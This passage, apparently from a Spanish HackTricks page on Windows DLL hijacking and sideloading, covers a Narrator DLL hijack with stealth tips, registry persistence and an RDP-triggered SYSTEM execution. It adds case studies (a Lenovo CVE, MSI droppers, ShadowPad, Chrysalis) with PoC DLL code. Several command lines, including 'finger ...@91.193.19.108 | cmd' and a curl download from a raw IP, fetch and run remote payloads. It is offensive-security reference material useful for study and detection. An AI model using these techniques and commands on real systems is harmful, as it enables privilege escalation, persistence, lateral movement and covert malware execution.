- Ruta heredada (compilaciones antiguas): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si existe una DLL escribible y controlada por un atacante en la ruta de OneCore, se carga y se ejecuta `DllMain(DLL_PROCESS_ATTACH)`. No se requieren exports.

Detección con Procmon
- Filtro: `Process Name is Narrator.exe` y `Operation is Load Image` o `CreateFile`.
- Inicia Narrator y observa el intento de carga de la ruta anterior.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Silencio OPSEC
- Un hijack ingenuo hará que la UI hable o resalte elementos. Para pasar desapercibido, al hacer attach enumera los threads de Narrator, abre el thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) y suspéndelo con `SuspendThread`; continúa en tu propio thread. Consulta el PoC para ver el código completo.<sup>[[8]](#references)</sup>

Activación y persistencia mediante la configuración de Accessibility
- Contexto del usuario (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con lo anterior, al iniciar Narrator se carga la DLL implantada. En el escritorio seguro (pantalla de inicio de sesión), pulsa CTRL+WIN+ENTER para iniciar Narrator; la DLL se ejecuta como SYSTEM en el escritorio seguro.

Ejecución de SYSTEM activada por RDP (movimiento lateral)
- Permite la capa de seguridad clásica de RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Conéctate por RDP al host y, en la pantalla de inicio de sesión, pulsa CTRL+WIN+ENTER para iniciar Narrator; la DLL se ejecuta como SYSTEM en el escritorio seguro.
- La ejecución se detiene cuando se cierra la sesión de RDP: inyecta o migra cuanto antes.

Bring Your Own Accessibility (BYOA)
- Puedes clonar una entrada de registro de una herramienta de Accessibility integrada (p. ej., CursorIndicator), modificarla para que apunte a un binario/DLL arbitrario, importarla y, luego, establecer `configuration` con el nombre de esa herramienta de Accessibility. Esto permite ejecutar código arbitrario mediante el framework de Accessibility.

Notas
- Para escribir en `%windir%\System32` y modificar valores de HKLM se requieren privilegios de administrador.
- Toda la lógica del payload puede estar en `DLL_PROCESS_ATTACH`; no se necesitan exports.

## Estudio de caso: CVE-2025-1729 - Escalada de privilegios mediante TPQMAssistant.exe

Este caso demuestra **Phantom DLL Hijacking** en el TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), identificado como **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalles de la vulnerabilidad

- **Componente**: `TPQMAssistant.exe`, ubicado en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tarea programada**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se ejecuta a diario a las 9:30 AM en el contexto del usuario con sesión iniciada.
- **Permisos del directorio**: El directorio permite escritura a `CREATOR OWNER`, lo que permite a los usuarios locales dejar archivos arbitrarios.
- **Comportamiento de búsqueda de DLL**: Intenta cargar primero `hostfxr.dll` desde su directorio de trabajo y registra "NAME NOT FOUND" si no la encuentra, lo que indica que se da prioridad a la búsqueda en el directorio local.

### Implementación del exploit

Un atacante puede colocar un stub malicioso de `hostfxr.dll` en el mismo directorio y aprovechar la DLL faltante para ejecutar código en el contexto del usuario:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Flujo de ataque

1. Como usuario estándar, coloca `hostfxr.dll` en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Espera a que la tarea programada se ejecute a las 9:30 AM en el contexto del usuario actual.
3. Si hay un administrador conectado cuando se ejecuta la tarea, la DLL maliciosa se ejecuta en la sesión del administrador con integridad media.
4. Encadena técnicas estándar de UAC bypass para escalar de integridad media a privilegios SYSTEM.

## Estudio de caso: MSI CustomAction Dropper + DLL Side-Loading mediante un host firmado (wsc_proxy.exe)

Los actores de amenazas suelen combinar droppers basados en MSI con DLL side-loading para ejecutar payloads bajo un proceso confiable y firmado.<sup>[[10]](#references)</sup>

Descripción general de la cadena
- El usuario descarga el MSI. Una CustomAction se ejecuta silenciosamente durante la instalación con GUI (p. ej., LaunchApplication o una acción de VBScript) y reconstruye la siguiente etapa a partir de recursos incrustados.
- El dropper escribe un EXE legítimo y firmado, y una DLL maliciosa, en el mismo directorio (ejemplo: wsc_proxy.exe firmado por Avast + wsc.dll controlada por el atacante).
- Al iniciar el EXE firmado, el orden de búsqueda de DLL de Windows carga primero wsc.dll desde el directorio de trabajo y ejecuta el código del atacante bajo un proceso principal firmado (ATT&CK T1574.001).

Análisis de MSI (qué buscar)
- Tabla CustomAction:
  - Busca entradas que ejecuten archivos ejecutables o VBScript. Patrón sospechoso de ejemplo: LaunchApplication que ejecuta un archivo incrustado en segundo plano.
  - En Orca (Microsoft Orca.exe), inspecciona las tablas CustomAction, InstallExecuteSequence y Binary.
- Payloads incrustados/divididos en el CAB del MSI:
  - Extracción administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
  - O usa lessmsi: lessmsi x package.msi C:\out
  - Busca varios fragmentos pequeños que se concatenen y descifren mediante una CustomAction de VBScript. Flujo habitual:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Sideloading práctico con wsc_proxy.exe
- Coloca estos dos archivos en la misma carpeta:
  - wsc_proxy.exe: host legítimo firmado (Avast). El proceso intenta cargar wsc.dll por nombre desde su directorio.
  - wsc.dll: DLL del atacante. Si no se requieren exportaciones específicas, DllMain puede ser suficiente; de lo contrario, crea una DLL proxy y reenvía las exportaciones necesarias a la biblioteca legítima mientras ejecutas el payload en DllMain.
- Crea un payload DLL mínimo:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Para cumplir los requisitos de exportación, usa un framework de proxy (p. ej., DLLirant/Spartacus) para generar una DLL de reenvío que también ejecute tu payload.

- Esta técnica depende de la resolución de nombres de DLL por parte del binario host. Si el host usa rutas absolutas o flags de carga segura (p. ej., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), el hijack podría fallar.
- KnownDLLs, SxS y las exportaciones reenviadas pueden influir en la precedencia, por lo que deben tenerse en cuenta al seleccionar el binario host y el conjunto de exportaciones.

## Triadas firmadas + payloads cifrados (estudio de caso de ShadowPad)

Check Point describió cómo Ink Dragon despliega ShadowPad mediante una **triada de tres archivos** para pasar desapercibido entre software legítimo y mantener cifrado en disco el payload principal:<sup>[[12]](#references)</sup>

1. **EXE host firmado** – Se abusa de proveedores como AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Los atacantes renombran el ejecutable para que parezca un binario de Windows (por ejemplo, `conhost.exe`), pero la firma Authenticode sigue siendo válida.
2. **DLL loader maliciosa** – Se deja junto al EXE con un nombre esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL suele ser un binario MFC ofuscado con el framework ScatterBrain; su única función es localizar el blob cifrado, descifrarlo y mapear ShadowPad de forma reflectiva.
3. **Blob de payload cifrado** – A menudo se almacena como `<name>.tmp` en el mismo directorio. Tras mapear en memoria el payload descifrado, el loader elimina el archivo TMP para destruir evidencia forense.

Notas de tradecraft:

* Renombrar el EXE firmado (manteniendo el `OriginalFileName` original en el encabezado PE) permite que se haga pasar por un binario de Windows y conserve la firma del proveedor. Por tanto, replica la costumbre de Ink Dragon de dejar binarios que parecen `conhost.exe`, pero que en realidad son utilidades de AMD/NVIDIA.
* Como el ejecutable sigue siendo de confianza, la mayoría de los controles de allowlisting solo requieren que tu DLL maliciosa esté junto a él. Enfócate en personalizar la DLL loader; normalmente, el proceso padre firmado puede ejecutarse sin modificaciones.
* El decryptor de ShadowPad espera que el blob TMP esté junto al loader y que se pueda escribir en él para poder sobrescribir el archivo con ceros tras mapearlo. Mantén el directorio con permisos de escritura hasta que cargue el payload; una vez en memoria, puedes eliminar el archivo TMP para proteger la OPSEC.

### Stager LOLBAS + cadena de DLL sideloading de archivo por etapas (finger → tar/curl → WMI)

Los operadores combinan DLL sideloading con LOLBAS para que el único artefacto personalizado en disco sea la DLL maliciosa junto al EXE de confianza:<sup>[[1]](#references)</sup>

- **Loader de comandos remoto (Finger):** PowerShell oculto inicia `cmd.exe /c`, obtiene comandos de un servidor Finger y los canaliza a `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` obtiene texto por TCP/79; `| cmd` ejecuta la respuesta del servidor, lo que permite a los operadores rotar la segunda etapa desde el servidor.

- **Descarga y extracción integradas:** Descarga un archivo con una extensión inocua, descomprímelo y prepara el objetivo de sideload junto con la DLL en una carpeta aleatoria de `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` oculta el progreso y sigue las redirecciones; `tar -xf` usa el tar integrado de Windows.

- **Lanzamiento mediante WMI/CIM:** Inicia el EXE mediante WMI para que la telemetría muestre un proceso creado por CIM mientras carga la DLL ubicada en el mismo directorio:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Funciona con binarios que prefieren DLL locales (p. ej., `intelbq.exe`, `nearby_share.exe`); el payload (p. ej., Remcos) se ejecuta con un nombre de confianza.

- **Búsqueda:** Genera una alerta sobre `forfiles` cuando `/p`, `/m` y `/c` aparecen juntos; es poco habitual fuera de scripts de administración.


## Caso de estudio: dropper NSIS + sideload del Bitdefender Submission Wizard (Chrysalis)

Una intrusión reciente de Lotus Blossom abusó de una cadena de actualización confiable para distribuir un dropper empaquetado con NSIS que preparaba un sideload de DLL, además de payloads completamente en memoria.<sup>[[13]](#references)</sup>

Flujo de operaciones
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca como **HIDDEN**, deposita un Bitdefender Submission Wizard renombrado (`BluetoothService.exe`), un `log.dll` malicioso y un blob cifrado `BluetoothService`, y luego inicia el EXE.
- El EXE anfitrión importa `log.dll` y llama a `LogInit`/`LogWrite`. `LogInit` carga el blob mediante mmap; `LogWrite` lo descifra con un flujo personalizado basado en LCG (constantes **0x19660D** / **0x3C6EF35F**, material de clave derivado de un hash previo), sobrescribe el búfer con shellcode en texto plano, libera los temporales y salta a él.
- Para evitar una IAT, el loader resuelve las APIs calculando el hash de los nombres de exportación con **FNV-1a, base 0x811C9DC5 + primo 0x1000193**, y luego aplica una etapa de mezcla tipo Murmur (**0x85EBCA6B**) y compara el resultado con hashes objetivo con salt.

Shellcode principal (Chrysalis)
- Descifra un módulo principal similar a un PE repitiendo operaciones de suma/XOR/resta con la clave `gQ2JR&9;` en cinco pasadas y luego carga dinámicamente `Kernel32.dll` → `GetProcAddress` para completar la resolución de importaciones.
- Reconstruye cadenas con nombres de DLL en tiempo de ejecución mediante transformaciones de rotación de bits/XOR por carácter y luego carga `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un segundo resolver que recorre **PEB → InMemoryOrderModuleList**, analiza cada tabla de exportación en bloques de 4 bytes con mezcla tipo Murmur y recurre a `GetProcAddress` solo si no encuentra el hash.

Configuración integrada y C2
- La configuración está dentro del archivo `BluetoothService` depositado en el **offset 0x30808** (tamaño **0x980**) y se descifra con RC4 usando la clave `qwhvb^435h&*7`, lo que revela la URL de C2 y el User-Agent.
- Los Beacons crean un perfil del host delimitado por puntos, anteponen la etiqueta `4Q` y luego lo cifran con RC4 usando la clave `vAuig34%^325hGV` antes de llamar a `HttpSendRequestA` por HTTPS. Las respuestas se descifran con RC4 y se distribuyen mediante un switch de etiquetas (`4T` shell, `4V` ejecución de procesos, `4W/4X` escritura de archivos, `4Y` lectura/exfiltración, `4\\` desinstalación, `4` enumeración de unidades/archivos + casos de transferencia por fragmentos).
- El modo de ejecución depende de los argumentos de CLI: sin argumentos = instalar persistencia (servicio/clave Run) que apunta a `-i`; `-i` vuelve a iniciar el propio proceso con `-k`; `-k` omite la instalación y ejecuta el payload.

Loader alternativo observado
- La misma intrusión depositó Tiny C Compiler y ejecutó `svchost.exe -nostdlib -run conf.c` desde `C:\ProgramData\USOShared\`, con `libtcc.dll` en el mismo directorio. El código fuente en C proporcionado por el atacante incluía shellcode, que se compilaba y ejecutaba en memoria sin escribir un PE en el disco. Reprodúcelo con:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Esta etapa de compilación y ejecución basada en TCC importó `Wininet.dll` en tiempo de ejecución y obtuvo un shellcode de segunda etapa desde una URL codificada, creando un loader flexible que se hace pasar por una ejecución del compilador.

## Signed-host sideloading with export proxying + host thread parking

Algunas cadenas de DLL sideloading añaden **ingeniería de estabilidad** para mantener activo el host legítimo el tiempo suficiente para cargar correctamente las etapas posteriores, en lugar de que se bloquee después de cargar la DLL maliciosa.<sup>[[11]](#references)</sup>

Patrón observado
- Coloca un EXE confiable junto a una DLL maliciosa usando el nombre de dependencia esperado, como `version.dll`.
- La DLL maliciosa **hace proxy de todas las exportaciones esperadas** hacia la DLL real del sistema (por ejemplo, `%SystemRoot%\\System32\\version.dll`) para que la resolución de importaciones siga funcionando y el proceso host continúe operativo.
- Después de cargarse, la DLL maliciosa **parchea el punto de entrada del host** para que el hilo principal entre en un bucle infinito de `Sleep`, en lugar de salir o ejecutar rutas de código que terminarían el proceso.
- Un hilo nuevo realiza el trabajo malicioso real: descifra el nombre o la ruta de la DLL de la siguiente etapa (RC4/XOR son métodos comunes) y luego la carga con `LoadLibrary`.

Por qué importa
- El proxying normal de DLL conserva la compatibilidad de API, pero no garantiza que el host siga activo el tiempo suficiente para las etapas posteriores.
- Aparcar el hilo principal en `Sleep(INFINITE)` es una forma sencilla de mantener residente el proceso firmado mientras el loader realiza el descifrado, el staging o el arranque de red en un hilo de trabajo.
- Buscar únicamente un `DllMain` sospechoso puede hacer que se pase por alto este patrón si el comportamiento interesante ocurre después de parchear el punto de entrada del host y de iniciar un hilo secundario.

Flujo de trabajo mínimo
1. Copia el EXE del host firmado y determina qué DLL carga desde el directorio local.
2. Crea una DLL proxy que exporte las mismas funciones y las reenvíe a la DLL legítima.
3. En `DllMain(DLL_PROCESS_ATTACH)`, crea un hilo de trabajo.
4. Desde ese hilo, parchea el punto de entrada del host o la rutina de inicio del hilo principal para que entre en un bucle de `Sleep`.
5. Descifra el nombre/configuración de la DLL de la siguiente etapa y llama a `LoadLibrary` o haz manual-map del payload.

Pistas defensivas
- Procesos firmados que cargan `version.dll` o bibliotecas comunes similares desde su propio directorio de aplicación, en lugar de `System32`.
- Parches de memoria en el punto de entrada del proceso poco después de cargar la imagen, especialmente saltos/llamadas redirigidos a `Sleep`/`SleepEx`.
- Hilos creados por una DLL proxy que llaman inmediatamente a `LoadLibrary` para cargar una segunda DLL con un nombre descifrado.
- DLL proxy con todas las exportaciones, ubicadas junto a ejecutables de proveedores en directorios de staging con permisos de escritura, como `ProgramData`, `%TEMP%` o rutas de archivos comprimidos extraídos.

## References

- [1] [Red Canary – Perspectivas de inteligencia: enero de 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Escalada de privilegios mediante TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking en Windows. Ejemplo sencillo en C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore despliega nuevo malware dirigido a Europa](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: cuando los DLL hijack se encuentran con los asistentes de Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Doppelgängers digitales: anatomía de campañas de suplantación en evolución que distribuyen Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Intereses convergentes: análisis de grupos de amenazas que apuntan a un gobierno del sudeste asiático](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Dentro de Ink Dragon: revelación de la red de retransmisión y el funcionamiento interno de una operación ofensiva sigilosa](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – La backdoor Chrysalis: análisis en profundidad del conjunto de herramientas de Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: cadena ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Seguimiento de las campañas de espionaje de 2026 de Screening Serpens, APT iraní](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Elemento `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Elemento `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Elemento `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Elemento `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Elemento `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Elemento `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Rápido y furioso: operaciones de Nimbus Manticore durante el conflicto iraní](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Acciones de tareas](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 apunta a gobiernos e infraestructura crítica del sudeste asiático](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
